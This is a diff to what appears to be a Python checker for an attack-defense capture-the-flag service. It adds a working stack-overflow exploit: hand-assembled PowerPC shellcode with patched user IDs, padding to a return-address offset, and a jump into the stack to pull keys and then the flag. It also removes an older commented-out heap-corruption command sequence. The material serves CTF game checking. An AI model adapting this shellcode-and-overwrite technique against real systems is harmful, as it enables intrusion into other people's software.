@@ -438,39 +438,78 @@ class OrcanoChecker(BaseChecker):
 				raise BrokenServiceException("exploit no attack_info")
 			uid0, uid1 = self.uid_from_attack_info(self.attack_info)
 
-			nums = []
+			# Retrieve keys
+			# SYNC: exploit.S
+			shellcode = [
+				0x3C600123, 0x60634567, 0x3C8089AB, 0x6084CDEF, # 0
+				0x3CA02000, 0x60A50000, 0x3CC08000, 0x60C64BE0, # 4
+				0x7CC903A6, 0x4E800421, 0x3CC08000, 0x60C64F3C, # 8
+				0x7CC903A6, 0x4E800421, 0x3C600123, 0x60634567, # 12
+				0x3C8089AB, 0x6084CDEF, 0x3CA02000, 0x60A50001, # 16
+				0x3CC08000, 0x60C64BE0, 0x7CC903A6, 0x4E800421, # 20
+				0x3CC08000, 0x60C64F3C, 0x7CC903A6, 0x4E800421, # 24
+				0x3CC08000, 0x60C64F84, 0x7CC903A6, 0x4E800421, # 28
+			]
+
+			# Patch payload
+			def patch_li_const(data, offset, val):
+				data[offset + 0] &= 0xffff0000
+				data[offset + 0] |= (val >> 16) & 0xffff
+				data[offset + 1] &= 0xffff0000
+				data[offset + 1] |= (val >> 0) & 0xffff
+
+			patch_li_const(shellcode, 0, uid0)
+			patch_li_const(shellcode, 2, uid1)
+			patch_li_const(shellcode, 14, uid0)
+			patch_li_const(shellcode, 16, uid1)
+
+			# consts
+			# SYNC: image.elf
+			ret_offset = 275 # offset of return address
+			current_stack = (
+				0x80049940 # measured in main
+				-1104 # reversed from processRequest
+			)
+			jump_target = current_stack + 0x8
+
+			payload = shellcode
+			payload += (ret_offset - len(payload)) * [8] # padding
+			payload += [jump_target]
+
+			# Sign extend
+			def signed_truncate(val, bits = 32):
+				new_val = val
+				new_val &= (2 ** bits - 1)
+				if new_val >= 2 ** (bits - 1):
+					new_val -= (2 ** bits)
+				return new_val
+			payload = map(signed_truncate, payload)
+			cmd = " ".join([str(x) for x in payload])
+
+			# Pwn
+			result_pwn = self.single_request([cmd])
+			if not result_pwn["ok"]:
+				raise BrokenServiceException("exploit shellcode failed")
+			if len(result_pwn["out"]) != 2:
+				raise BrokenServiceException("")
+
+			key0 = result_pwn["out"][0]
+			key1 = result_pwn["out"][1]
+
+			uid = (uid0, uid1)
+			key = (key0, key1)
+
+			# Retrieve data
 			conn = self.begin_conn()
-			# todo(orcanojr): update for junior
-			"""for i in range(32): # some max for flag len since self.flag isn't accessible
-				exploit_cmds = [
-					"user",
-					"del",
-					"weight:" + ("A" * 256),
-					"del",
-				]
-				exploit_cmds += [
-					"int:i{}".format(i),
-					"int:i{}".format(uid1),
-					"int:i{}".format(uid0),
-					"int:i0xc",
-					"int:i0x47544e51",
-					"inspect:i5:pAPsA",
-					"getn:i0",
-				]
-
-				result = self.make_request(conn, exploit_cmds)
-				if not result["ok"]:
-					self.debug("Failed to get flag byte {}, err: {}".format(i, result["err"]))
-					raise BrokenServiceException("exploit request error")
-				if len(result["out"]) != 1 or not isinstance(result["out"][0], int):
-					self.debug("Bad response for flag byte {}, out: {}".format(i, result["out"]))
-					raise BrokenServiceException("exploit bad response")
-				num = result["out"][0]
-				if not num:
-					break
-				nums.append(num)"""
+			cmds = []
+			cmds += [self.make_user(uid, key)]
+			cmds += self.make_get_data(32)
+			result = self.make_request(conn, cmds)
 			self.end_conn(conn)
+			if not result["ok"]:
+				raise BrokenServiceException("exploit retrieve request error")
 
+			nums = result["out"]
 			got_flag = self.flag_from_nums(nums)
 			self.debug("Got flag: {}".format(got_flag))
 			if not self.search_flag(got_flag):
